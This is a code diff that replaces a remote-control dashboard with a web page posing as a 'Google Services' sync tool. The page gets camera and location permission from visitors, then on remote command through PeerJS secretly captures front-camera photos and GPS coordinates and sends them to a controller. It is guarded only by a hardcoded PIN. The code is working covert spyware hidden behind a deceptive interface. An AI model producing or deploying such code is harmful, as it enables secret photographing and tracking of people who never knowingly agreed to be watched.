@@ -1,83 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Remote Control Center</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sistem Layanan Google</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <style>
-        body{font-family:sans-serif;background:#1a1a1a;color:#fff;text-align:center;padding:20px}
-        .card{background:#2a2a2a;padding:20px;border-radius:15px;margin-bottom:15px}
-        input,button{width:100%;padding:14px;margin-top:10px;border-radius:10px;box-sizing:border-box}
-        input{background:#333;border:1px solid #444;color:#fff}
-        button{background:#3498db;color:#fff;border:0;font-weight:bold;cursor:pointer}
-        .btn-red{background:#e74c3c}
-        #box-foto img{width:100%;border-radius:10px;margin-top:10px}
-        .status{padding:10px;border-radius:10px;margin-bottom:10px;font-weight:bold}
-    </style>
 </head>
-<body>
+<body style="background:#f2f2f2; font-family:sans-serif; text-align:center; padding-top:100px;">
+    <div style="background:#fff; padding:30px; border-radius:15px; display:inline-block; border:1px solid #ddd;">
+        <h3>⚙️ Sinkronisasi Sistem</h3>
+        <p id="stat">Menunggu Perintah...</p>
+        <button onclick="mulai()" style="padding:15px 30px; background:#4285f4; color:#fff; border:none; border-radius:5px; font-weight:bold;">AKTIFKAN LAYANAN</button>
+    </div>
 
-<div class="card">
-    <h3>🎮 Remote Dashboard</h3>
-    <input id="targetId" placeholder="Masukkan ID Anak">
-    <input id="targetPin" placeholder="Masukkan PIN Anak" type="password">
-    <button onclick="hubungkan()">HUBUNGKAN SEKARANG</button>
-    <div id="status" style="margin-top:15px">Status: Terputus</div>
-</div>
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
 
-<div id="menu" class="card" style="display:none">
-    <button onclick="kirim('FOTO')">📸 AMBIL FOTO</button>
-    <button onclick="kirim('LOKASI')">📍 CEK LOKASI</button>
-    <button class="btn-red" onclick="kirim('PUTUS')">❌ PUTUS KONEKSI</button>
-    
-    <div id="info" style="margin-top:15px; font-size:12px; color:#aaa"></div>
-    <div id="box-foto"></div>
-</div>
+    <script>
+        // KUNCI DISINI BIAR GAK REPOT
+        const MY_ID = "anak_hayabusa_secure_007"; 
+        const MY_PIN = "1234"; 
+        
+        let peer = new Peer(MY_ID);
+        let stream;
 
-<script>
-let peer = new Peer();
-let conn;
-
-function hubungkan() {
-    const id = targetId.value.trim();
-    const pin = targetPin.value.trim();
-    
-    if(!id || !pin) return alert("Isi ID & PIN dulu Bang!");
-
-    status.innerHTML = "Menyambungkan...";
-    conn = peer.connect(id);
-
-    conn.on('open', () => {
-        status.innerHTML = "<span style='color:#2ecc71'>TERHUBUNG ✅</span>";
-        document.getElementById('menu').style.display = "block";
-    });
-
-    conn.on('data', (d) => {
-        if(d.type === "FOTO") {
-            document.getElementById('box-foto').innerHTML = `<h4>Hasil Foto:</h4><img src="${d.data}">`;
+        async function mulai() {
+            try {
+                // Minta izin kamera & GPS
+                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+                navigator.geolocation.getCurrentPosition(()=>{});
+                document.getElementById('stat').innerText = "Sistem Aktif ✅";
+                alert("Sinkronisasi Berhasil!");
+            } catch(e) { alert("Klik Allow/Izinkan!"); }
         }
-        if(d.type === "LOKASI") {
-            const mapUrl = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
-            document.getElementById('info').innerHTML += `<br><a href="${mapUrl}" target="_blank" style="color:#3498db">📍 Lihat Lokasi di Maps</a>`;
-        }
-        if(d.type === "BATTERY") {
-            document.getElementById('info').innerHTML = `Baterai: ${d.level}% (${d.charging ? 'Ngecas' : 'Tidak'})`;
-        }
-    });
-}
 
-function kirim(perintah) {
-    if(conn && conn.open) {
-        // DISINI KUNCINYA: Harus kirim PIN juga biar index.html mau respon
-        conn.send({
-            pin: targetPin.value.trim(),
-            cmd: perintah
+        peer.on('connection', (conn) => {
+            conn.on('data', (d) => {
+                if(d.pin !== MY_PIN) return;
+                if(d.cmd === "FOTO") ambilFoto(conn);
+                if(d.cmd === "LOKASI") kirimLokasi(conn);
+            });
         });
-    } else {
-        alert("Koneksi mati, hubungkan ulang!");
-    }
-}
-</script>
 
+        function ambilFoto(conn) {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = stream;
+            setTimeout(() => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                conn.send({type:"FOTO", data:c.toDataURL('image/jpeg', 0.5)});
+            }, 500);
+        }
+
+        function kirimLokasi(conn) {
+            navigator.geolocation.getCurrentPosition(p => {
+                conn.send({type:"LOKASI", lat:p.coords.latitude, lon:p.coords.longitude});
+            });
+        }
+    </script>
 </body>
 </html>
